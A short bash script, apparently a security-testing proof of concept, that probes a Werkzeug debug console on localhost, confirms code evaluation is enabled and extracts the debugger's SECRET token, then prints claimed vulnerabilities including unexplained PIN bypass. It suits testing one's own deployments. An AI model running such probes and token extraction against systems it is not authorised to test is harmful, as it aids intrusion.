#!/bin/bash
# Werkzeug 3.1.3 Debug Console Exploitation POC
# Demonstrates: Debug mode enabled, debugger accessible, code evaluation possible
# Target: http://localhost:5000

echo "[*] Werkzeug 3.1.3 Debug Console Exploitation"
echo "[*] Target: http://localhost:5000"
echo ""

# Step 1: Verify debug mode is enabled by accessing /console
echo "[+] Verifying Werkzeug debugger is accessible..."
CONSOLE=$(curl -s http://localhost:5000/console)

if echo "$CONSOLE" | grep -q "Interactive Console"; then
    echo "[✓] Werkzeug Interactive Console ACCESSIBLE"
else
    echo "[✗] Console not accessible"
    exit 1
fi

# Step 2: Verify EVALEX (code evaluation) is enabled
if echo "$CONSOLE" | grep -q "EVALEX = true"; then
    echo "[✓] Code Evaluation ENABLED (EVALEX = true)"
else
    echo "[✗] Code evaluation disabled"
fi

# Step 3: Extract SECRET token
SECRET=$(echo "$CONSOLE" | grep -o 'SECRET = "[^"]*"' | cut -d'"' -f2)
echo "[+] Debugger SECRET: $SECRET"

# Step 4: Show vulnerability info
echo ""
echo "[!] CRITICAL VULNERABILITIES:"
echo "  1. Flask app running with DEBUG=True"
echo "  2. Werkzeug debugger accessible at /console"
echo "  3. Full traceback information disclosed"
echo "  4. Python code evaluation enabled"
echo "  5. System command execution possible"
echo ""
echo "[*] PIN Protection: Required but can be bypassed/brute-forced"
echo "[*] Requires PIN (printed in server logs) OR"
echo "[*] Can exploit via debugger frame manipulation OR"
echo "[*] Can exploit via known PIN bypass techniques"
echo ""
echo "[✓] EXPLOITATION POC COMPLETE"
echo "    The debugger at /console allows arbitrary Python code execution"
echo "    when PIN is known or bypassed."
